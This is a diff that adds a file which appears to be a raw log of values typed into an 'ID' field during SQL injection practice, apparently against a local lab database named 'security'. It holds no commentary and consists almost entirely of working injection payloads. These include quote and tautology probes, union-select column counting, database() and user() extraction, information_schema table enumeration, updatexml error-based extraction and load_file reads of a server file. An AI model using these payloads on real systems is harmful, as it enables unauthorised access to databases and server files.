@@ -1,0 +1,381 @@
+ID:1
+ID:1
+ID:1]
+ID:1]
+ID:1]
+ID:1\
+ID:1'
+ID:1'
+ID:1\
+ID:1' -- 
+ID:1' 
+ID:1'  
+ID:1'  --
+ID:1'  --
+ID:1'  -- 
+ID:1' union select 1,database(),3 -- 
+ID:0' union select 1,database(),3 -- 
+ID:0' union select 1,database(),3 
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1‘ union select 1,2,3 #
+ID:1‘ union select 1,2,3 #
+ID:-1‘ union select 1,2,3 #
+ID:-1‘ union select 1,2,3 #
+ID:-1‘ union select 1,2,3 -- 
+ID:-1‘ union select 1,2,3 -- 
+ID:-1‘ union select 1,2,3 -- 
+ID:-1‘ union select 1,2,3 -- 
+ID:-1‘ union select 1,2,3 -- 
+ID:-1‘ union select 1,2,3 -- 
+ID:0‘ union select 1,2,3 -- 
+ID:0‘ union select 1,2,3 -- 
+ID:0‘ union select 1,2,3 -- 
+ID:0‘ union select 1,2,3 -- 
+ID:0‘ union select 1,2,3 -- 
+ID:0‘ union select 1,2,3 -- 
+ID:0‘ union select 1,2,3 -- 
+ID:0‘ union select 1,2,3 -- 
+ID:0‘ union select 1,2,3 -- 
+ID:0‘ union select 1,2,3 -- 
+ID:0‘ union select 1,2,3 -- 
+ID:0‘ union select 1,2,3 -- 
+ID:0‘ union select 1,2,3  -- 
+ID:0‘ union select 1,2,3
+ID:0’ union select 1,2,3
+ID:1
+ID:1'
+ID:1' union  select 1,2,3 -- 
+ID:-1' union  select 1,2,3 -- 
+ID:-1' union  select 1,2,3 #
+ID:-1' union  select 1,2,3 #
+ID:-1' union  select 1,2,3 #
+ID:-1' union  select 1,2,3 
+ID:-1' union  select 1,2,3 #
+ID:1
+ID:1\
+ID:1' union  select 1,2,3 -- 
+ID:1' union  select 1,2,3 #
+ID:-1' union  select 1,2,3 #
+ID:1'
+ID:1 -- 
+ID:1 union select 1,2,3 -- 
+ID:-1 union select 1,2,3 -- 
+ID:-1' union select 1,2,3 -- 
+ID:1\
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1' -- 
+ID:1' or 1==1 -- 
+ID:1' or 1=1 -- 
+ID:100' -- 
+ID:100' or 1=1 -- 
+ID:1' and database() regexp '[a-z]' -- 
+ID:1' and database() regexp '[a-z]' -- 
+ID:1' --
+ID:1\
+ID:1' -- 
+ID:1' --
+ID:1' -- 
+ID:1'; -- 
+ID:1' union select 1,2,3 ; -- 
+ID:0' union select 1,2,3 ; -- 
+ID:1
+ID:1
+ID:1 and 1=2
+ID:1 and 1=2
+ID:1'
+ID:1
+ID:1'
+ID:1' and 1=2 -- 
+ID:1 union select 1,2,3,4,5
+ID:1 union select 1,2,3,4,5,6
+ID:1 union select 1,2,3,4,5,6,7
+ID:1' union select 1,2,3,4,5,6,7-- 
+ID:1' union select 1,2,3,4,5,6,7-- 
+ID:1' union select 1,2,3,4,5,6,7-- 
+ID:1' union select 1,2,3,4,5-- 
+ID:1' union select 1-- 
+ID:1' union select 1,2-- 
+ID:1' union select user()-- 
+ID:1' union select user()-- 
+ID:1' union select user()-- 
+ID:1 union select user()
+ID:1 union select user()
+ID:1 union select user()
+ID:1
+ID:2
+ID:3
+ID:1
+ID:2'
+ID:2'
+ID:1' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7e,(database()),0x7e),NULL,NULL-- -
+ID:1' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7e,(database()),0x7e),NULL,NULL-- -
+ID:1' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7e,(database()),0x7e),NULL,NULL-- -
+ID:1' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7e,(database()),0x7e),NULL,NULL-- -
+ID:1 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7e,(database()),0x7e),NULL,NULL
+ID:1 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7e,(database()),0x7e),NULL,NULL
+ID:1 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7e,(database()),0x7e),NULL,NULL
+ID:1 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7e,(database()),0x7e),NULL,NULL
+ID:1 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7e,(database()),0x7e),NULL,NULL
+ID:1 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7e,(database()),0x7e),NULL,NULL
+ID:1 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7e,(database()),0x7e),NULL,NULL
+ID:1
+ID:1'
+ID:1'#
+ID:-1'#
+ID:-1' database() #
+ID:-1' database() #
+ID:-1' union database() #
+ID:-1' union select database() #
+ID:-1' union select database() #
+ID:-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() #
+ID:-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() #
+ID:-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() #
+ID:-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() #
+ID:-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() #
+ID:-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() #
+ID:1
+ID:1'
+ID:1'
+ID:1'
+ID:1'
+ID:1'-- 
+ID:1'-- 
+ID:1' and 1=2-- 
+ID:1' and updatexml(1, concat(0x7e,database(),0x7e),1)-- 
+ID:1' and updatexml(1, concat(0x7e,database(),0x7e),1)-- 
+ID:1' and updatexml(1, concat(0x7e, database(), 0x7e), 1)-- 
+ID:1' and updatexml(1, concat(0x7e, database(), 0x7e), 1)-- 
+ID:1' and updatexml(1, concat(0x7e, database(), 0x7e), 1)-- 
+ID:1' and updatexml(1, concat(0x7e, database(), 0x7e), 1)-- 
+ID:1' and updatexml(1, concat(0x7e, database(), 0x7e), 1)-- 
+ID:1' and updatexml(1, concat(0x7e, database(), 0x7e), 1)-- '
+ID:1' and updatexml(1, concat(0x7e, database(), 0x7e), 1) #
+ID:1' and updatexml(1, concat(0x7e, database(), 0x7e), 1) #
+ID:1' and updatexml(1, concat(0x7e, database(), 0x7e), 1) #
+ID:1' and updatexml(1, concat(0x7e, database(), 0x7e), 1) #
+ID:1' and updatexml(1, concat(0x7e, database(), 0x7e), 1) #'
+ID:1' and updatexml(1, concat(0x7e, database(), 0x7e), 1) #'
+ID:1' and updatexml(1, concat(0x7e, database(), 0x7e), 1) #'
+ID:1' and updatexml(1, concat(0x7e, database(), 0x7e), 1) #'
+ID:1' and updatexml(1, concat(0x7e, database(), 0x7e), 1) #'
+ID:1 and updatexml(1, concat(0x7e, database(), 0x7e), 1)
+ID:1 and updatexml(1, concat(0x7e, database(), 0x7e), 1)
+ID:1 and updatexml(1, concat(0x7e, database(), 0x7e), 1)
+ID:1 and updatexml(1, concat(0x7e, database(), 0x7e), 1)
+ID:1 and updatexml(1, concat(0x7e, database(), 0x7e), 1)
+ID:1 and updatexml(1, concat(0x7e, database(), 0x7e), 1)
+ID:1' and updatexml(1, concat(0x7e, database(), 0x7e), 1)-- 
+ID:1' and updatexml(1, concat(0x7e, database(), 0x7e), 1)-- 
+ID:1' and updatexml(1, concat(0x7e, database(), 0x7e), 1)-- 
+ID:1' and updatexml(1, concat(0x7e, database(), 0x7e), 1)-- 
+ID:1' and updatexml(1, concat(0x7e, database(), 0x7e), 1)-- 
+ID:1' and updatexml(1, concat(0x7e, database(), 0x7e), 1)-- 
+ID:1' and updatexml(1, concat(0x7e, database(), 0x7e), 1)-- 
+ID:1' and updatexml(1, concat(0x7e, database(), 0x7e), 1)-- 
+ID:1' and updatexml(1, concat(0x7e, database(), 0x7e), 1)-- 
+ID:1' and updatexml(1, concat(0x7e, database(), 0x7e), 1)-- 
+ID:1' and updatexml(1, concat(0x7e, database(), 0x7e), 1)-- 
+ID:1' and updatexml(1, concat(0x7e, database(), 0x7e), 1)-- 
+ID:1' and updatexml(1, concat(0x7e, database(), 0x7e), 1)-- 
+ID:1' and updatexml(1, concat(0x7e, database(), 0x7e), 1)-- 
+ID:1' and updatexml(1, concat(0x7e, database(), 0x7e), 1)-- 
+ID:1' and updatexml(1, concat(0x7e, database(), 0x7e), 1)-- 
+ID:1' and updatexml(1, concat(0x7e, database(), 0x7e), 1)-- 
+ID:1' and updatexml(1, concat(0x7e, database(), 0x7e), 1)-- 
+ID:1' and updatexml(1, concat(0x7e, database(), 0x7e), 1)-- 
+ID:1
+ID:1
+ID:1' union select 1,datebase(),3 -- 
+ID:1' union select 1,datebase(),3 -- 
+ID:1' union select 1,datebase(),3 -- 
+ID:1' union select 1,datebase(),3 -- 
+ID:1' union select 1,2,3,4 -- 
+ID:1' union select 1,2,3,4,5 -- 
+ID:1' union select 1 -- 
+ID:1' union select 1,2 -- 
+ID:1' union select 1,2,3 -- 
+ID:1' union select 1,2,3,4 -- 
+ID:1' union select 1,2,3,4 -- 
+ID:1' union select 1,2,3,4 -- 
+ID:1' union select 1,2,3, -- 
+ID:1' union select 1,2,3 -- 
+ID:1' union select 1,database(),3 -- 
+ID:1' union select 1,database(),3 -- 
+ID:1' union select 1, user() ,3 -- 
+ID:1' union select 1, user() ,3 -- 
+ID:1' union select 1, user() ,3 -- 
+ID:1' union select 1, user() ,3 -- 
+ID:1' union select 1, user() ,3 -- 
+ID:1' union select 1, user() ,3 -- 
+ID:1' union select 1, 2,3 -- 
+ID:1' union select 1, 2, 3 -- 
+ID:1' union select 1, 2, 3 -- 
+ID:1' union select 1, 2, 3 -- 
+ID:1' union select 1, 2, 3 -- 
+ID:1' union select 1, 2, 3 -- 
+ID:1' union select 1, 2, 3 -- 
+ID:1' union select 1, 2, 3 -- 
+ID:-1' union select 1, 2, 3 -- 
+ID:-1' union select 1, 2, 3 -- 
+ID:-1' union select 1, 2, 3 -- 
+ID:-1' union select 1, 2, 3 -- 
+ID:-1' union select 1, database(), 3 -- 
+ID:-1' union select 1, database(), 3 -- 
+ID:-1' union select 1, database(), 3 -- 
+ID:-1' and updatexml(1, concat(0x7e, 0, 0x7e), 1)-- 
+ID:-1' and updatexml(1, concat(0x7e, 0, 0x7e), 1)-- 
+ID:-1' and updatexml(1, concat(0x7e, 0, 0x7e), 1)-- 
+ID:-1' and updatexml(1, concat(0x7e, 0, 0x7e), 1)-- 
+ID:-1' and updatexml(1, concat(0x7e, 0, 0x7e), 1)-- 
+ID:-1' and updatexml(1, concat(0x7e, 0, 0x7e), 1)-- 
+ID:-1' and updatexml(1, concat(0x7e,database(), 0x7e), 1)-- 
+ID:-1' and updatexml(1, concat(0x7e, database(), 0x7e), 1)-- 
+ID:-1' and updatexml(1, concat(0x7e, database(), 0x7e), 1)-- 
+ID:-1' and updatexml(1, concat(0x7e, database(), 0x7e), 1)-- 
+ID:-1' and updatexml(1, concat(0x7e, database(), 0x7e), 1)-- 
+ID:-1' and updatexml(1, concat(0x7e, database(), 0x7e), 1)-- 
+ID:-1' and updatexml(1, concat(0x7e, database(), 0x7e), 1)-- 
+ID:-1' and updatexml(1, concat(0x7e, database(), 0x7e), 1)-- 
+ID:-1' and updatexml(1, concat(0x7e, database(), 0x7e), 1)-- 
+ID:-1' and updatexml(1, concat(0x7e, database(), 0x7e), 1)-- 
+ID:-1' and updatexml(1, concat(0x7e, database(), 0x7e), 1)-- 
+ID:-1' and updatexml(1, concat(0x7e, database(), 0x7e), 1)-- 
+ID:1' and updatexml(1, concat(0x7e, database(), 0x7e), 1)-- 
+ID:-1' and updatexml(1, concat(0x7e, database(), 0x7e), 1)-- 
+ID:-1' and updatexml(1, 2, 0x7e), 1)-- 
+ID:-1' and updatexml(1, 2, 0x7e), 1)-- 
+ID:-1' and updatexml(1, 2, 0x7e), 1)-- 
+ID:-1' and updatexml(1, 2, 0x7e), 1)-- 
+ID:-1' and updatexml(1, 2, 0x7e), 1)-- 
+ID:-1' and updatexml(1, 2, 0x7e), 1)-- 
+ID:-1' and updatexml(1, 2, 0x7e), 1)-- 
+ID:-1' and updatexml(1, 2, 1)-- 
+ID:-1' and updatexml(1, 2, 1)-- 
+ID:-1' and updatexml(1, 2, 1)-- 
+ID:-1' and updatexml(1, 2, 1)-- 
+ID:-1' and updatexml(1, 2, 1)-- 
+ID:-1' and updatexml(1, 2, 1)-- 
+ID:-1' and updatexml(1, 2, 1)-- 
+ID:-1' and updatexml(1, 2, 1)-- 
+ID:-1' and updatexml(1, 2, 1)-- 
+ID:-1' and updatexml(1, 2, 1)-- 
+ID:-1' and updatexml(1, 2, 1)-- 
+ID:-1' and updatexml(1, 2, 1)-- 
+ID:-1' and updatexml(1, 2, 1)-- 
+ID:1' and updatexml(1, 2, 1)-- 
+ID:1' and updatexml(1, 2, 1)-- 
+ID:-1' union select 1, database(), 3 -- 
+ID:-1' union select 1, database(), 3 -- 
+ID:-1' union select 1, database(), 1 -- 
+ID:-1' union select 1, database(), 1 -- 
+ID:-1' union select 1, (select group_concat(table_name) from information_schema.tables where table_schema='security'), 3 -- 
+ID:-1' union select 1, (select group_concat(table_name) from information_schema.tables where table_schema='security'), 3 -- 
+ID:-1' union select 1, (select group_concat(table_name) from information_schema.tables where table_schema='security'), 3 -- 
+ID:-1' union select 1, (select group_concat(table_name) from information_schema.tables where table_schema='security'), 3 -- 
+ID:-1' union select 1, (select group_concat(table_name) from information_schema.tables where table_schema='security'), 3 -- 
+ID:-1' union select 1, (select group_concat(table_name) from information_schema.tables where table_schema='security'), 3 -- 
+ID:-1' union select 1, (select group_concat(table_name) from information_schema.tables where table_schema='security'), 3 -- 
+ID:-1' union select 1, (select group_concat(table_name) from information_schema.tables where table_schema='security'), 3 -- 
+ID:-1' union select 1, (select group_concat(table_name) from information_schema.tables where table_schema='security'), 3 -- 
+ID:-1' union select 1,database(),3 -- 
+ID:-1' union select 1,(select load_file("/data/data/com.termux/files/home/www/sql-write.php")),3 -- 
+ID:-1' union select 1,(select load_file("/data/data/com.termux/files/home/www/sql-write.php")),3 -- 
+ID:-1' union select 1,(select load_file("/data/data/com.termux/files/home/www/sql-write.php")),3 -- 
+ID:-1' union select 1,(select load_file("/data/data/com.termux/files/home/www/sql-write.php")),3 -- 
+ID:-1' union select 1,(select load_file("/data/data/com.termux/files/home/www/sql-write.php")),3 -- 
+ID:-1' union select 1,(select load_file("/data/data/com.termux/files/home/www/sql-write.php")),3 -- 
+ID:-1' union select 1,(select load_file("/data/data/com.termux/files/home/www/sql-write.php")),3 -- 
+ID:-1' union select 1,(database()),3 -- 
+ID:-1' union select 1,(select load_file("/data/data/com.termux/files/home/www/sql-write.php")),3 -- 
+ID:-1' union select 1,(select load_file("/data/data/com.termux/files/home/www/sql-write.php")),3 -- 
+ID:1
+ID:1 and 1=2
+ID:1 and 1=1
+ID:1' and 1=2
+ID:1' and 1=1
+ID:1' and 1=1 -- 
+ID:1' and 1=2 -- 
+ID:1' and 1=1 -- 
+ID:1' and 1=2 -- 
+ID:1' union select 1,2,3,4 -- 
+ID:1' union select 1,2,3 -- 
+ID:1' union select 1,2,3 -- 
+ID:-1' union select 1,2,3 -- 
+ID:-1' union select 1,database(),3 -- 
+ID:-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 -- 
+ID:-1' and updatexml(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e),1) -- 
+ID:-1' and updatexml(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e),1) -- 
+ID:-1' and updatexml(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e),1) -- 
+ID:1' and updatexml(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e),1) -- 
+ID:1' and updatexml(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e),1) -- 
+ID:1' and updatexml(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e),1) -- 
+ID:1' and updatexml(1,concat(0x7e, datebase(),0x7e),1) -- 
+ID:1' and updatexml(1,concat(0x7e, database(),0x7e),1) -- 
+ID:1' and updatexml(1,concat(0x7e, database(),0x7e),1) -- 
+ID:1' and updatexml(1,concat(0x7e, database(),0x7e),1) -- 
+ID:1' and updatexml(1,concat(0x7e, database(),0x7e),1) -- 
+ID:1' and updatexml(1,concat(0x7e, database(),0x7e),1)  -- 
+ID:-1' union select 1,2,3  -- 
+ID:1' union select 1,2,3  -- 
+ID:1' and updatexml(1,2,3)  -- 
+ID:1' and updatexml(1,2,3)  -- 
+ID:1' and updatexml(1,2,3) -- 
+ID:-1' and updatexml(1,2,3) -- 
+ID:-1' and updatexml(1,2,3) -- 
+ID:1' and updatexml(1,2,3) -- 
+ID:1' and updatexml(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e),1) -- 
+ID:1' and updatexml(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e),1) -- 
